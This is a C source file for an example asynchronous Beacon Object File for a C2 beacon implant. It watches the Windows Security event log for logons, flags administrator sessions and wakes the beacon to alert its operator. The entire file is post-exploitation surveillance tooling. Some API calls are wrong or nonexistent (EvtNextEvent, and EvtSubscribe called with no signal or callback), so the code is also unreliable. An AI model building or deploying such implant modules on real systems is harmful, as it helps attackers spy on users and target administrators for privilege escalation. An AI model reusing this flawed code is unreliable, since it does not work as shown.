/**
 * @file monitor_logon.c
 * @brief Example Async BOF: Monitor User Logon Events
 * @author Offensive Security Researcher
 * @date 2025
 *
 * This BOF demonstrates async-safe execution by monitoring Windows
 * for user logon events and immediately waking the beacon when an
 * administrator logs in.
 *
 * KEY FEATURES:
 * - Runs in background without blocking beacon
 * - Monitors event log for logon events (ID 4624)
 * - Detects admin logons specifically
 * - Uses BeaconWakeup() to immediately alert operator
 * - Responds to BeaconGetStopJobEvent() for graceful shutdown
 */

#include <windows.h>
#include <winevt.h>
#include <stdio.h>

// Beacon API declarations (standard BOF format)
DECLSPEC_IMPORT void    BeaconPrintf(int type, const char* fmt, ...);
DECLSPEC_IMPORT void    BeaconOutput(int type, const void* data, int len);
DECLSPEC_IMPORT void*   BeaconAlloc(size_t size);
DECLSPEC_IMPORT void    BeaconFree(void* ptr);
DECLSPEC_IMPORT BOOL    BeaconWakeup(void);
DECLSPEC_IMPORT HANDLE  BeaconGetStopJobEvent(void);

// Constants
#define LOGON_EVENT_ID 4624
#define ADMIN_GROUP_SID "S-1-5-32-544"

/**
 * @brief Check if user is an administrator based on logon event
 */
BOOL IsAdminLogon(EVT_HANDLE hEvent)
{
    if (hEvent == NULL) {
        return FALSE;
    }

    // Render event XML to extract user information
    DWORD dwBufferSize = 0;
    DWORD dwBufferUsed = 0;
    DWORD dwPropertyCount = 0;

    if (!EvtRender(NULL, hEvent, EvtRenderEventXml, 0, NULL, &dwBufferUsed, &dwPropertyCount)) {
        if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
            return FALSE;
        }
    }

    LPWSTR pXml = (LPWSTR)BeaconAlloc(dwBufferUsed);
    if (pXml == NULL) {
        return FALSE;
    }

    if (!EvtRender(NULL, hEvent, EvtRenderEventXml, dwBufferUsed, pXml, &dwBufferUsed, &dwPropertyCount)) {
        BeaconFree(pXml);
        return FALSE;
    }

    // Parse XML to check for admin privileges
    // In production, you'd use XML parsing or regex
    // For demonstration, we'll do a simple substring check
    BOOL bIsAdmin = FALSE;

    if (wcsstr(pXml, L"Admin") != NULL ||
        wcsstr(pXml, L"Administrator") != NULL ||
        wcsstr(pXml, ADMIN_GROUP_SID) != NULL) {

        bIsAdmin = TRUE;
    }

    BeaconFree(pXml);
    return bIsAdmin;
}

/**
 * @brief Extract username from logon event
 */
void ExtractUsername(EVT_HANDLE hEvent, wchar_t* wsUsername, DWORD dwSize)
{
    if (hEvent == NULL || wsUsername == NULL) {
        return;
    }

    DWORD dwBufferSize = 0;
    DWORD dwBufferUsed = 0;
    DWORD dwPropertyCount = 0;

    if (!EvtRender(NULL, hEvent, EvtRenderEventXml, 0, NULL, &dwBufferUsed, &dwPropertyCount)) {
        if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
            return;
        }
    }

    LPWSTR pXml = (LPWSTR)BeaconAlloc(dwBufferUsed);
    if (pXml == NULL) {
        return;
    }

    if (!EvtRender(NULL, hEvent, EvtRenderEventXml, dwBufferUsed, pXml, &dwBufferUsed, &dwPropertyCount)) {
        BeaconFree(pXml);
        return;
    }

    // Simple extraction - find <Data> tag in event
    // Production code should use proper XML parsing
    wchar_t* pStart = wcsstr(pXml, L"<Data>");
    if (pStart != NULL) {
        pStart += 6; // Skip "<Data>"
        wchar_t* pEnd = wcsstr(pStart, L"</Data>");
        if (pEnd != NULL) {
            DWORD dwLen = min((DWORD)(pEnd - pStart), dwSize - 1);
            wcsncpy_s(wsUsername, dwSize, pStart, dwLen);
            wsUsername[dwLen] = L'\0';
        }
    }

    BeaconFree(pXml);
}

/**
 * @brief Monitor security event log for logon events
 *
 * This function:
 * 1. Subscribes to Security log event log
 * 2. Filters for Event ID 4624 (logon)
 * 3. Checks each logon for admin privileges
 * 4. Immediately wakes beacon on admin logon
 * 5. Responds to stop signal for graceful shutdown
 */
void MonitorLogonEvents(void)
{
    EVT_HANDLE hSubscription = NULL;
    EVT_HANDLE hEvent = NULL;
    DWORD dwStatus = ERROR_SUCCESS;

    BeaconPrintf(0, "[Async BOF] Starting logon monitoring...\n");

    // Get stop event handle
    HANDLE hStop = BeaconGetStopJobEvent();
    if (hStop == NULL) {
        BeaconPrintf(0, "[Async BOF] ERROR: Failed to get stop event\n");
        return;
    }

    // Subscribe to Security log
    LPCWSTR wsXPath = L"*[System[(EventID=4624)]]";

    hSubscription = EvtSubscribe(
        NULL,
        NULL,
        L"Security",
        wsXPath,
        NULL,
        NULL,
        NULL,
        EvtSubscribeToFutureEvents
    );

    if (hSubscription == NULL) {
        dwStatus = GetLastError();
        BeaconPrintf(0, "[Async BOF] ERROR: EvtSubscribe failed (%d)\n", dwStatus);
        return;
    }

    BeaconPrintf(0, "[Async BOF] Successfully subscribed to logon events\n");

    // Monitor loop
    while (TRUE) {
        // Check if we should stop
        DWORD dwWaitResult = WaitForSingleObject(hStop, 1000); // Check every second

        if (dwWaitResult == WAIT_OBJECT_0) {
            BeaconPrintf(0, "[Async BOF] Received stop signal, shutting down...\n");
            break;
        }

        // Try to get next event
        DWORD dwTimeout = 100; // 100ms timeout for event retrieval
        hEvent = EvtNextEvent(hSubscription, dwTimeout);

        if (hEvent == NULL) {
            DWORD dwError = GetLastError();
            if (dwError == ERROR_NO_MORE_ITEMS || dwError == ERROR_TIMEOUT) {
                // No new events, continue monitoring
                continue;
            } else {
                // Error occurred
                BeaconPrintf(0, "[Async BOF] ERROR: EvtNextEvent failed (%d)\n", dwError);
                break;
            }
        }

        // Process the event
        wchar_t wsUsername[256] = L"<unknown>";

        if (IsAdminLogon(hEvent)) {
            ExtractUsername(hEvent, wsUsername, 256);

            // IMPORTANT: Wake up the beacon immediately!
            BeaconWakeup();

            // Format alert message
            char szAlert[512];
           _snprintf_s(szAlert, sizeof(szAlert), _TRUNCATE,
                "[ALERT] Administrator logon detected: %ls",
                wsUsername);

            BeaconPrintf(0, "%s\n", szAlert);

            // In production, you might want to:
            // 1. Gather additional context (logon type, source machine, etc.)
            // 2. Check if this is a new admin session vs existing
            // 3. Trigger automated response (e.g., ticket generation)
        } else {
            // Regular user logon, just log it
            ExtractUsername(hEvent, wsUsername, 256);
            BeaconPrintf(0, "[INFO] User logon: %ls\n", wsUsername);
        }

        // Close event handle
        EvtClose(hEvent);
        hEvent = NULL;
    }

    // Cleanup
    if (hEvent != NULL) {
        EvtClose(hEvent);
    }

    if (hSubscription != NULL) {
        EvtClose(hSubscription);
    }

    BeaconPrintf(0, "[Async BOF] Logon monitoring stopped\n");
}

/**
 * @brief BOF entry point
 *
 * Standard BOF signature: void bof_main(datap* parser, int argc)
 */
void bof_main(void* parser, int argc)
{
    // In a real implementation, you'd parse arguments here
    // For this example, we just start monitoring

    BeaconPrintf(0, "[Async BOF] MonitorLogon BOF starting\n");

    MonitorLogonEvents();

    BeaconPrintf(0, "[Async BOF] MonitorLogon BOF exiting\n");
}
